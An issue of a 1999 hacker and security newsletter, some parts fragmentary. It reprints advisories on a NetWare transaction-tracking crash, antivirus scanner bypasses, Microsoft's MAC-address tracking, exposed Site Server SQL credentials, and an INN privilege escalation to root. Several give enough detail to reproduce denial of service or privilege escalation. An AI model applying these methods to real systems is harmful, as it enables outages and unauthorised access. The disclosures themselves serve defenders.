   Synopsis 
   ---------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... <g>

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you are
    ~~~~~~~  reading this from some interesting places, make my day and get a
             mention in the zine, send in a postcard, I realize that some places
             it is cost prohibitive but if you have the time and money be a cool
             dude / gal and send a poor guy a postcard preferably one that has some
             scenery from your place of residence for my collection, I collect stamps
             too so you kill two birds with one stone by being cool and mailing in a
             postcard, return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) ;-)
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. <g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it <BeG>

    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

     leet (l33t?) dewds' <see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)
             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's

    CCC    - Chaos Computer Club (Germany)

   *CON    - Conference, a place hackers crackers and hax0rs among others go to swap
             ideas, get drunk, swap new mad inphoz, get drunk, swap gear, get drunk

             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no

              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala
            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me

        R2-D2. For those of you who have been dead for the last seven years R2-D2 is a android from the Star Wars
        movie series. The hack consisted of covering the dome in red, white, blue, and black mesh-fabric panels. 
        The hackers left a dozen doughnuts and instructions on how to remove the display. The Great Dome has been 
        a popular place for Hacks in the past. Some of the better known ones have transformed the Dome into a

                                 Application : NDS
                                    Severity : High
      
      
      Synopsis
      --------
      
      It is possible to overflow the Transaction Tracking System (TTS) built into
      Novell Netware and possibly crash multiple servers.
      
      Tested configuration
      --------------------
      
      The testing was done with the following configuration:
      
      Netware 4.11, Service Pack 5B
      
      Also confirmed on Netware 4.1. All systems had 64MB RAM and 1 GB drive space.
      
      Bug(s) report
      -------------
      
      The Transaction Tracking System (TTS) is used by Novell Netware to help
      preserve the integrity of data during a system crash. If a transaction is in
      the process of being written to the hard drive when the system crashes, upon
      reboot the partial transaction is backed out preserving the integrity of the
      original data. Administrators can optionally flag a file with the TTS flag
      to add this protection (typically done with databases, especially those that
      have no rollback features).
      
      TTS by default tracks 10,000 transactions, and each instance uses a small
      amount of memory. If a burst of transactions are sent to the server and the
      available memory is exhausted, TTS will disable. While TTS is disabled, no
      updates can be made to Netware Directory Services. This can impact any program
      or process that updates NDS, such as login. In extreme overrun cases, such as
      very large simultaneous (or near simultaneous, actually) transactions, memory
      will be depleted quick enough to crash the server.
      
      This is not entirely uncommon, as any large burst of traffic updating NDS
      will cause the problem, such as bringing up a server after several days of
      downtime that has a Directory Services replica on it. Normally this can be
      corrected by increasing RAM or lowering the amount of transactions tracked
      >from the maximum default of 10,000 down to say 5,000 by issuing the command
      SET MAXIMUM TRANSACTIONS = 5000 at the console or via ServMan, and enabling
      TTS by typing ENABLE TTS at the console.
      
      However, a malicious user with proper access can force the memory depletion
      and potentially crash a server that has a replica of the NDS database. This
      can lead to multiple near-simultaneous server crashes.
      
      Of course anyone with administrative access can do this, but they could
      obviously do other acts that could be just as destructive, if not more so.
      What is needed is the ability to create a large number of NDS updates very
      quickly. For example, if a user has the ability to create a container and
      add objects to it, them that user has enough authority to potentially cause
      problems to TTS. Creating a container, dropping a few hundred objects into the
      container via drag-and-drop and then deleting the container should suffice.
      
      If the server lacks a large amount of free memory, the server will quite
      possibly abend. In other cases, TTS is disabled, which is a form of Denial of
      Service. As the messages are sent across to other servers containing NDS
      replicas, they too may crash. In our test environment we were able to crash
      two servers (Netware 4.1 and Netware 4.11) with a the scenario of creating a
      container, adding a few hundred users, and then deleting the container.
      
      Solution/Workaround
      -------------------
      
      NMRC has heard reports of as many as a dozen servers crashing within a couple
      of minutes of each other, so apply the latest Service Pack for Netware 4.x on
      all servers or upgrade to Netware 5.
      
      Comments
      --------
      
      Novell has already been notified and they are obviously aware of the TTS
      limitations (refer to the May 1997 TID 2908153 at
      http://support.novell.com/cgi-bin/search/tidfinder.cgi?2908153 for an example).
      Per Novell the latest patches for Netware 4.x correct the problem, and Netware
      5 does not have the problem at all.
      
      Thanks to Michel Labelle <divebc@hotmail.com> for notifying NMRC about this
      problem.

      This product has a major defect.
      We have it running on our Exchange Server
      with 1,300 mailboxes yet viruses keep spreading directly from email.  I
      did some investigating tonight and found the problem.
      
      It is ONLY scanning the Inbox folder tree.  This would sound simply like
      a poor design but it is MUCH worse.
      
      The Inbox Rules Wizard can store the user's rules on the Exchange Server
      which will move a message to a specific folder without the message ever
      being placed in a user's inbox.  This causes it to comletely by-pass the
      InoculateIT Real-Time Scanner.
      
      My CA rep confirmed the problem with CA support who had no work-around
      available at this time.

 04.1 CA's Inoculan software vulnerabilities on NT Workstation SP3 or SP4
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Date: Sat, 8 May 1999 14:58:08 +1000
      From: Glenn Corbett <Glenn.Corbett@bigpond.com>
      To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
      Subject: Insecure Bahaviour in Inoculan Client
      
      Russ,
      
      A problem has been discovered with the InocuLAN client on Windows NT
      workstations. If an account lockout policy is present on a Windows NT
      domain, large numbers of repeating account lockouts can occur.
      
      Description:  Incorrect password events (event id 529) are being logged from
      workstations when running applications from UNC paths. The username that
      has logged the incorrect password is different to that of the logged on
      user.
      
      Configuration: Windows NT workstation SP3 or SP4, with InocuLAN V4.0(373) or
      InocuLAN V4.0(375)
      
      To reproduce the problem:
      1.      Install InocuLAN V4.0(373) or V4.0(375) onto an NT workstation with
      SP3 or SP4 (SP5 not tested yet)
      
      2.      Configure InocuLAN as described below:
      Options:
      Direction - Incoming and Outgoing files
      Action upon Virus detection - Cure File
      Cure Action for Macro Viruses - Remove Infected Macros
      Copy File before Cure
      Rename File when Cure Fails
      Rename Extension - AVB
      Move Directory - C:\Inoculan\VIRUS
      
      Protected Areas:
      Protect Floppy Drives
      Protect Network Drives
      Protect CD-ROM Drives
      
      Scan Type - Secure Scan
      
      3.      Reboot the workstation
      
      4.      Log into WorkstationA as Domain UserA, Logout Domain UserA
      
      5.      From another workstation change the password of Domain UserA
      
      6.      Log into WorkstationA as Domain UserB.
      
      7.      From WorkstationA run an application from a remote share on WorkstationX
      where Logon and Logoff, Success/Failure, are being audited. Run an
      application from the cmd window using a UNC path with no other connections
      to the WorkstationX.  Eg \\WorkstationX\shareX\notepad
      
      8.      The application will take several seconds to run and there will be a
      failure security event (529) for UserA from Workstation A.  From server
      manager remotely stop the Cheyenne InocuLAN Anti-Virus Server on Workstation
      A and repeat step 7.  You will see that the application will start
      immediately and no errors will be recorded in the security event log.
      
      The above problem also causes problems when running logon scripts.  If an
      application is called from the logon script and that application does not
      exit on the local workstation, the version in the logon share will be run.
      As soon as the application in the logon script is called there is an event
      529 error recorded on the logon server security event log.
      
      Even if subsequent different users log into Workstation A, these problem
      will continue until the workstation is rebooted.
      
      This behaviour can also been seen if in Step 4, a local userA logs on. The
      subsequent error 529's have the local userA account in the security event.
      
      It appears as though InocuLAN is storing the user credentials for the first
      logged on user and using them to scan network drives for virus' even when a
      different user subsequently logs on until workstation reboot. It is not yet
      apparent if this username / password is being stored in the registry /
      temporary file or memory, and therefore open to exploit.
      
      We do not see this problem with InocuLAN V4.0 (4.0 Service Pack 1).
      
      CA Have been notified earlier this week, no respose as yet.

      From: ARCNT <ARCNT@CAI.COM>
      To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
      Subject: FW: NTBUGTRAQ response - URGENT
      
      The issue reported to NTBUGTRAQ regarding InocuLAN v4.0 build 373 and 375
      implies that username/password information is stored "somewhere" on the
      client
      side and as such could potentially be exploited.
      
      That assertion is inaccurate, the username/password credential combination
      
      is NOT stored on the client side by Inoculan, (which is why the efforts to
      locate
      these credentials in shared memory, in a file or in the registry have been
      
      unsuccessful).
      
      Clearly, in order for the InocuLAN real-time scanner to access files on a
      remote server,
      the software must have valid security contexts in place to permit the
      requisite access
      to the file systems and files.
      
      The techniques utilized by Inoculan (using low level, but fully documented
      and
      supported standard vendor API's) do NOT require that traditional user
      credentials (user account/ password) be presented in order to gain the
      necessary
      access.
      
      Rather, Inoculan is able to gain the required access in a completely
      secure manner without prompting for username and password information.
      
      In addition, it is important to point out that NO attempt to retrieve
      credential data
      is done without the user's explicit advance knowledge and consent.
      
      Computation/generation of the requisite credential information is done at
      Inoculan driver
      initialization time, and can be easily refreshed by simply rebooting the
      machine (which of
      course will in turn result in Inoculan initialization routines being
      invoked as part of
      system restart).
      
      The particular behaviour observed and reported can be attributed to the
      fact that AFTER
      Inoculan initialization was completed, the user access credentials for the
      user in question
      were modified, rendering the originally computed credential that Inoculan
      would otherwise
      utilize, invalid.
      
      An enhancement is being developed presently to provide a configuration
      setting that
      will instruct the Inoculan real-time scanner to recompute credentials
      automatically thus
      eliminating the need to reboot the client machine.
      
      This enhancement will be available by 17:00 Eastern US time, May 21, 1999,
      and can be
      downloaded from the standard Computer Associates support web sites,
      (http://support.cai.com).
      
      We appreciate the efforts involved in bringing this issue to our attention
      and look forward
      to being able to provide you continued responsive service in the future !

 05.0 [ISN] Everywhere your MAC address shows up

      MICROSOFT'S HEAVY HAND IN THE COOKIE JAR        
      A special report from YEOW - Barry Simon. 
      
      See the Woody's Office Watch discussion and details on the Office 97
      privacy problem. Issues 4.11 and 4.12
      
      Because of the important Internet Explorer 5 coverage some regular WWW
      features have been held over to the next issue. 
      
      We reported earlier on the brouhaha over the inclusion of hardware IDs in
      the Pentium III chip and privacy advocates' concerns about it.  Turns out
      many of us already have hardware IDs on our systems since all Ethernet
      cards have a MAC (stands for 'Media Access Control', whatever that
      means!), a six byte ID number that networks need to be sure to properly
      direct network packets.  Of course, the Pentium III ID's are more serious
      since many home systems don't (yet) have network cards and the biggest
      privacy concerns are in the consumer space.
      
      Due to wonderful sleuthing by Richard Smith of PharLap (who earlier
      located the April Fool's Bug discussed in WWW issue 2.2), the world has
      discovered a number of places that Microsoft has been using these MACs -
      in Windows 98 IDs, in Office 97 documents and in the microsoft.com
      cookies.  And privacy concerns result from all these uses. 
      
      To understand the issues, try a few experiments.  First, you'll need your
      MAC assuming you have an Ethernet adapter.  With Windows 9x, run the
      program winipcfg from the Run box.  It should load with a dropdown that
      says 'PPP Adapter'.  Change the dropdown to the name of your hardware
      adapter.  The Adapter Address field will say something like
      00-70-06-9A-8E-43.  That's your MAC.  Each byte is presented as two hex
      digits (0 through 9 or A-F) for a 12 character ASCII string which is what
      Microsoft uses.  With Windows NT, run instead winmsd, go to the Network
      tab and pick Transports and you'll get the MAC. 
      
      For the next experiment, you'll need to look at a Word 97 document in text
      mode.  You can't do this with Word.  If you have Quick View Plus (plain
      Quick View won't do), open a Word doc in QVP, go to the View menu and pick
      View as Text.  Or make a small Word doc, save it and rename it to a .txt
      extension and open it in Notepad.  Now search for the string PID.  You
      should find _PID_ GUID and shortly afterwards, a long hex string inside
      braces such as {F96EB3B9-C9F1-11D2-95EB-0060089BB2DA}. Those 12 hex digits
      at the end will be your MAC.  Yup, every Word doc, every Excel spreadsheet
      and every Power Point presentation is branded with an identifier showing
      the PC it came from.  If your boss has a Word memo you sent her and a copy
      of the anonymous whistle blowing attachment you sent to the Feds, she
      could determine they were made on the same machine.  (Of course, if you
      aren't careful, the document includes an author name and if any
      corrections were made, it may say who made the corrections.  Within the
      next few days, Microsoft expects to post a white paper on all the
      'metadata'; embedded in Office documents). 
      
      To run the next experiments, you'll need Windows 98, so I'll tell you what
      happens so you can follow along in any event.  In your Windows directory,
      you'll find a file called reginfo.txt. Open it in Notepad and look for a
      line called HWID; it ends with your MAC.  This file is created when you
      install Windows and is transmitted to Microsoft when you register.  And
      here's the clincher: even if you check the box not to send hardware
      information, this data is sent.  And it's even worse - the data collection
      code is in an ActiveX control that can be used by any Internet site out
      there.  Pharlap has a demo to illustrate this: go there and it displays
      your MAC on screen.  Any site knowing of this control could track MACs of
      all Windows 98 visitors to their sites.  There is also a demo and
      discussion at Windows Magazine.  By the way, this ActiveX control is also
      in the Windows 2000 beta so if Microsoft hadn't been found out, NT users
      would have been hit next. 
      
      Next, go to your cookies directory and open the text file whose name ends
      with microsoft.txt (it probably has a username@ in front where username is
      your login name).  In it you'll find a string called GUID that includes
      your MAC (GUID, by the way, is short for Global Unique Identifier).  This
      cookie is sent to www.microsoft.com every time you visit that site.  You
      may have realized they were making a cookie when you registered at their
      site but I bet you didn't realize they were adding hardware information
      without your permission. (Actually the Win98 Registration Wizard made the
      cookie before you went to the Microsoft site.) 
      
      You might want to search your Registry for your MAC as a string.  I found
      mine numerous times - two in suspicious places viz a viz Microsoft.  It's
      part of a key for Media Player called Client ID (is this passed on to the
      Media Player servers?) and as part of a key HKCU\Identities that seems to
      be connected with Outlook Express 5.0. 
      
      There is certainly plenty here for the paranoid.  Microsoft is collecting
      and storing in its databases unique hardware information.  That
      information brands your documents, and is always sent on when you access
      Microsoft's site.  One has to consider the possibility that Microsoft is
      keeping some master database tracking all sorts of interactions based on
      your MAC.  And one has to allow the possibility that the MAC will be
      encoded in the information that is sent by the Office Registration Wizard
      in Office 2000. 
      
      Microsoft has reacted vigorously to the developments in this story.  They
      have two customer letters ( here and here) on their site in which they
      promise to remove the hardware ID part of the registration wizard in a
      Win98 upgrade.  They also promise to delete 'any hardware ID information
      that may have been inadvertently gathered without the customer having
      chosen to provide Microsoft with this information.' Tools have already
      been posted to remove branding from Office applications and from
      already-created docs and there is a promise that branding will be removed
      >from the final version of Office 2000. 
      
      Beyond these actions, there has been a full court spin operation.  Some MS
      representatives have (unwisely in my opinion) attempted to minimize the
      issue.  There have been claims that the doc branding was a part of a
      feature, never implement, intended solely to help network administrators. 
      There has been harping on the fact that the MAC only identifies a machine
      but not an individual - true but not of much comfort in many cases. We've
      been told that Windows 98 sending a HWID even if you said not to send
      hardware information was a bug, not a feature - an inadvertent programming
      error.  There's been no new statement about the use of MACs in cookies
      which I find most disturbing. 
      
      We've been told by Microsoft representatives that the Office 2000
      Registration Wizard doesn't collect MACs or anything like a MAC.  Indeed,
      they claim that while the Office CD serial number can be reconstructed
      >from the 16 byte code sent by the wizard, the hardware info does not allow
      reconstruction.  In particular, if the different CDs were used on the same
      machine, they'd be unable to tell that the codes came from the same
      machine. 
      
      
        _____
      
      The problem with the Microsoft position is that the company has so little
      credibility and there is too much of a pattern here.  We pride ourselves
      on taking a middle road on Microsoft at Woody's newsletters.  We don't
      hesitate to put their feet to the fire but, on the other hand, we don't
      take the position that Microsoft is the root of all evil and everything
      they say and do is two faced.  That said, Woody's middle name isn't Polly
      and mine isn't Anna.  Microsoft has amply demonstrated that it is company
      policy to, er, shade the truth when doing so serves a perceived business
      purpose.  We see it in the leaked disinformation about Windows 2000
      shipping this fall, we've seen it in their previous reactions to
      accusations and we saw it too often in the testimony at the DOJ trial. 
      
      That means one has to take skeptically every statement that Microsoft has
      made about the MAC problem.  I'm inclined to believe that branding of
      Office documents wasn't part of a plot to link together our entire lives
      in Microsoft's databases.  But I'm insulted that they try to bat their
      eyelashes and claim to us that the sending of the HWID even when you told
      them not to send hardware info was an inadvertent error.  And I'm
      concerned that we have no way of knowing that they've kept their promise
      to remove hardware IDs from their internal databases.  Indeed, my
      presumption is that they will not. 
      
      I worry that Microsoft is tucking all sorts of things into the holes they
      aren't discussing.  While they have said they'll stop using HWID, they
      have also said they'll continue to use the MSID number which is created by
      the Windows 98 Registration wizard.  And, guess what?  As discovered by
      Peter Siering at the German publication C'T Magazine, the registration
      wizard also creates a Microsoft cookie that includes MSID. So even after
      the apologies and changes, it seems Microsoft will be quite capable of
      tracking us and linking online visits to registration information.
      
      It's interesting about credibility.  There was also an Intel slip reported
      recently that they claimed was inadvertent.  Apparently some mobile
      Pentium II's shipped with hardware IDs even though these were only
      announced for Pentium III's. Intel's explanation is that they experimented
      with this feature in the manufacturing process for the mobile Pentium II
      but it was supposed to be disabled before shipping.  One line
      inadvertently didn't do the disabling.  Intel's credibility is such that
      I'm willing to accept their claim of inadvertence here.

 06.0 [ALERT] Site Server 3.0 May Expose SQL IDs and PSWs
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Date: Tue, 11 May 1999 16:27:38 -0600
      From: Mark <mark@NTSHOP.NET>

      Subject: [ALERT] Site Server 3.0 May Expose SQL IDs and PSWs
      
      ====================================================
      Site Server's AdSamples Directory Reveals ID and PSW
                 Discovered by Andrey Kruchkov
      ====================================================
      
      VERSIONS EFFECTED
      
      * Tested on Microsoft Site Server 3.0 Commerce Edition
      
      DESCRIPTION
      
      Site Server allows the installation of an AdSamples directory, which serves
      to demonstrate the capabilities of the Ad Server component. If this
      directory is installed and left open to the public without limiting
      directory permissions, a user can obtain a site configuration file
      (SITE.CSC) that contains sensitive information pertaining to an SQL
      database. This information could contain a DSN, as well as a a username and
      password used by the Ad Server to access the SQL server database.
      
      COMMENTS
      
      Andrey reported this problem to NTSECURITY.NET and has informed Microsoft of
      this issue.
      
      Andrey points out an easy way to eliminate this risk:
      
      Remove the "AdSamples" virtual directory from the DEFAULT root Web site, or
      change security permissions for this folder to sufficiently restrict access.
      If you must provide loose access to this virtual directory for some strange
      reason, then you should at least adjust the security permissions for the
      SITE.CSC file so that it's not available for viewing. Also keep in mind that
      there may be numerous  other SITE.CSC files under your Site Server
      installation, all of which need to be secured.
      
      For a URL that demonstrates the problem, please visit
      http://www.ntsecurity.net/scripts/loader.asp?iD=/security/siteserver-2.htm
      
      This is probably a great time to remind people once again to NEVER install
      sample content on production servers and to NEVER use the built-in IIS
      DEFAULT Web site without first thoroughly investigating the implications of
      doing so.

 07.0 inndstart vulnerability, possible root compromise
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Subject: INN 2.0 and higher. Root compromise potential
      
      Copyright 1999 Forrest J. Cavalier III, Mib Software
      This information is provided by Mib Software, www.mibsoftware.com.
      This notice can be distributed without limitation.
      
      Summary:
      --------
         INN is open source NNTP (Usenet) server software from the Internet
         Software Consortium. http://www.isc.org/
      
         In some cases, there is potential for the local news user,
         or any local user, to execute arbitrary code as root.
      
         The two vulnerabilities reported below have already been
         discussed in the Usenet newsgroup news.software.nntp.
         Therefore, the vendor is being sent this notice now, and
         was not notified previously.
      
         INN is communications software. Mib Software knows of
         no buffer overrun exploits of the affected versions of
         INN, but the possibility cannot be ruled out.  This would
         be the only way a root compromise using a remote connection
         would be possible.
      
      Background:
      -----------
         Since NNTP defines a privileged port (119), a SUID root
         wrapper, inndstart, binds to the port, and then is
         intended to drop root privileges, setting the UID to user
         news before exec() innd.  In some cases, this behavior
         can be altered to gain privileges.
      
      ------------------------------------------------------------
      Vulnerability 1 (pathrun should not be trusted information)
      ------------------------------------------------------------
      Summary: It is possible for the news user to control the behavior
         of the inndstart program so that root privileges are not
         dropped, and execute arbitrary programs as root.
      
      Versions affected: INN 2.0 and higher.
      Versions not affected: INN 1.7.2 and lower.
      
      Details: inndstart determines the target UID and GID from
         the UID and GID of a directory which is normally owned
         by user news, group news.  The directory which is checked
         can be changed be editing the "pathrun" parameter
         in the inn.conf configuration file.
      
         By specifying a directory with appropriate ownership, inndstart
         can exec() running as any user, including root.
      
         During the course of normal operation, innd forks() and executes
         many child processes, and it is relatively simple to run arbitrary code
         from innd.
      
      Solution: modify the source file innd/inndstart.c to use a
         hard coded pathrun, instead of the structure member
         innconf->pathrun.
      
      Workaround: There is no workaround.  The source must be modified.
      
      ------------------------------------------------------------------
      Vulnerability 2 (inndstart should be protected,
                       INNCONF environment variable should not be trusted.)
      ------------------------------------------------------------------
      Versions affected: INN 2.x after July 9, 1998 (including INN 2.1
           and higher.)
      Versions not affected: INN 1.7.2 and lower.
      
      Details: Normally, the SUID root program inndstart, should be
         in a directory accessible only by user news.  In some
         installations, this program is accessible to all local users.
      
         On July 9, 1998 a source code change was introduced which
         obtains the path of the configuration file from the environment
         variable INNCONF.  In those installations with inndstart
         accessible to local users, a local user can set INNCONF in the
         environment and determine the behavior of inndstart
         so that abitrary programs are executed.
      
         If the pathrun vulnerability above is fixed, these programs run as
         user news, if not fixed, they run as user root.
      
      Solution: Install inndstart in a directory with 0700 permissions
         owned by user news.

 08.0 Sunsolve.Database leaks crucial info about itself and its users
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Date: Tue, 11 May 1999 19:22:59 +0100
      From: "Robson, Ken" <RobsonK@EBRD.COM>
      To: BUGTRAQ@netspace.org
      Subject: Sun Microsystems Leaks extensive Amounts of Information About Itself 
               & It's Customers Through Its Sunsolve Database...
      
      Hi Folks,
      
      I have just been scouring Sun's Bug Reports for some information and I
      discovered that you can easily trawl for useful information about both Sun
      and its clients.  Information exposed includes:-
      
      *       Copies of /etc/passwd (i.e. user names)
      *       Copies of /etc/shadow (i.e. encrypted passwords)
      *       Configuration of network services (i.e. inetd.conf)
      
      It is trivial to put together searches that glean this for some of their
      customers.  Whilst the contract services restrictions are in place for
      accessing these accounts, logins must be in wide circulation.  I know 3 or 4
      accounts from various past employers myself.
      
      When logging a support call I do not often consider what might happen to the
      call notes.  I am sure that Sun are not the only company doing this and this
      is not aimed at Sun in particular, they are just an example.  Serious
      consideration should be given to what information you are prepared to pass
      to those who support you - do you trust the rest of their customers (at
      best) or the entire internet (at worst).
      
      Anyway not earth shattering but food for thought.
      
      Regards,
      
      Ken.
      
      PS - Please do not interpret the domain that this mail comes from as any
      indication that I work for the European Bank for Reconstruction &
      Development.  I in fact contract to Hewlett Packard and am simply based at
      the bank - all the opinions expressed above are my own and have nothing to
      do with either of these organisations.

      The actual service order notes are not available to customers through SunSolve
      - but parts of bug reports that may be generated by them are.  At least a few
      years ago when I worked in SunService they reminded us not to put customer
      information in the public part of bug reports, but there was no review system
      to make sure we didn't screw up.  If you want to protect yourself, make sure
      that if your call results in a bug report you go to SunSolve and review the
      public copy to make sure there's nothing in there you wouldn't want others to
      see and if there is, call up your service rep and make them move it to the
      sun-internal-access-only section of the bug report.
      
      Disclaimer: I no longer work in Tech Support at Sun and do not and cannot
      speak for SunService or whatever they're called after the latest "realignment
      of the Sun planets".

 09.0 [ISN] Asia is wide open to virus, hacker attacks
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Forwarded From: William Knowles <erehwon@kizmiaz.dis.org>
      
      
      http://www.feer.com/Restricted/99may_20/tech.html
      
      
      (Feer.com) [5.20.99] How personal are personal computers? At the rate
      Asian companies and individuals are exposing their computers to on-line
      infection and intrusion, they may as well drop the "P" from PC. The
      information highways are proving very public, but many Asians are
      travelling naked and defenceless.
      Computer viruses are the region's biggest problem. Two major virus attacks
      in March and April crippled hundreds of thousands of Asia's computers.
      Then in late April, the Singapore government was caught snooping into PCs
      without seeking permission from their owners. The incidents have
      highlighted the need to protect PCs from viruses and unwanted
      intruders--protection that's sorely lacking in the region.
      
      
      While multinational companies now keep a constant vigil on the security of
      their computer networks, many other companies and individuals have left
      themselves vulnerable. To protect against viruses, they need to install
      and diligently update antivirus software, which costs an average of $50
      per program for personal use.  Large companies have for many years
      installed virtual "firewalls" that combine antivirus, antihacking and
      other protective software, but antihacking and personal-data security
      programs are only just becoming commercially available to individual PC
      users.
      
      
      The latest virus hit more than 650,000 computers in Asia. Named Chernobyl,
      it remained dormant until April 26, the 13th anniversary of the Chernobyl
      nuclear-plant disaster in Ukraine. On that day, the virus disabled
      computers, destroyed programs and erased large amounts of stored
      information. Xinhua news agency reported that 360,000 PCs were affected in
      China. The virus's Taiwanese creator, 24-year-old Chen Ing-hau, said he
      had wanted to cause mayhem on the mainland. Chen was arrested but released
      without charge due to a lack of plaintiffs in Taiwan, where no infections
      were reported. 
      "Chernobyl's been known about and treatable for over a year and still
      people were caught out,"  says Daniel Schneersohn, Hong Kong-based
      regional director for Symantec, an American maker of antivirus software.
      He says many customers had such software installed, but had simply not
      activated it. Half of the damaged PCs in China, for instance, had
      protective software that was not turned on. Although most corporate PCs
      shipped to South Korea since 1997 contain antivirus software, Chernobyl
      infected an estimated 250,000 PCs in that country.  Many companies allow
      their employees to turn off antivirus software, which can slow down the
      computer while it monitors infections. Many users had failed to keep
      installed software up-to-date. "It's not enough to buy antivirus software
      and install it or even activate it,"  says Schneersohn. "You've got to
      update the software--the antivirus companies update the virus threat lists
      every week."
      
      
      Eric Sheridan, director of Asia business development for U.S. 
      computer-systems company Corporate Software & Technology, says most of his
      customers, almost all multinationals, escaped Chernobyl unscathed.  "Our
      customers all have ongoing contracts for security and virus protection, or
      they have good in-house teams at work," he explains.
      
      
      Most at risk are individual PC users and companies with less sophisticated
      information-technology departments, Sheridan says, especially as they make
      increasing use of the Internet. "Once you have a few offices up and
      on-line you have to take outside threats like viruses and hacking
      seriously." 
      
      
      Schneersohn agrees that while multinational firms are taking these threats
      seriously, the rest of the Asia-Pacific isn't. "Even some big listed
      companies in Hong Kong don't use antivirus protection," he says.
      
      
      Smaller businesses in particular have turned to pirated antivirus programs
      during the economic crisis to keep costs down. But they lose the
      advantages of software support and advice, says Schneersohn. "It's
      software use at its lowest level and that's why the highest level of
      infections are in small businesses and homes"  where pirated programs are
      most prevalent.
      
      
      Still, even pirated-software users could have protected themselves by
      downloading updates of antivirus programs from the manufacturer's Web
      site. For now, most software companies don't bother to trace pirates who
      download updates, says Schneersohn--although Symantec's next generation of
      antivirus software will update only registered users.
      
      
      Just as the dust settled from the Chernobyl attack, Internet users in
      Singapore were faced with a more organized affront to their computer
      privacy. SingNet, an Internet service provider, acknowledged that it asked
      the Home Affairs Ministry's IT security unit to scan its customers' PCs
      for viruses without their consent. SingNet is owned by Singapore Telecom,
      which is in turn 80%-owned by the government.  SingNet's actions only came
      to light because a student, who had downloaded antihacker software from
      the Internet onto her PC, traced the scan back to the ministry.
      
      
      SingNet's home page on the Web apologizes for the intrusion--"We should
      have informed you first," it says--and invites visitors to voluntarily
      submit to the virus search instead.  The company says the scanning did not
      "enter"  any PCs nor unveil any personal data. Also, SingNet claims it
      found 900 PCs infected with "trojan horse" viruses that allow hackers to
      enter computers via the Internet and take almost complete control.
      
      
      The SingNet action and the discovery of the "trojan horse" viruses
      highlight the ease with which PCs can be snooped on while on-line. "If
      breaking in is so easy, some less scrupulous companies may well start
      thinking that it might be worth throwing a few bucks at some kid to look
      into their competitors' files," says Schneersohn.
      
      
      For personal and small-business users, encryption is one option for
      protecting confidential data from hackers. But use of encryption is either
      illegal or legally untested in many Asian countries. A second option is to
      remove confidential data to a separate disk drive and access it only when
      the user is off-line.
      
      
      To protect stored data while the user is on-line, demand will probably
      grow among personal and small-business PC owners for simpler versions of
      the "firewalls" that large companies use to protect their computer
      networks from intrusion.
      
      
      Schneersohn says antivirus software makers are already looking into the
      market. "Many people want to block access to personal files to all third
      parties--you could call it a personal firewall. They simply want to regain
      control of what's happening on their computers."

 10.0 More on Zyklon's legal troubles
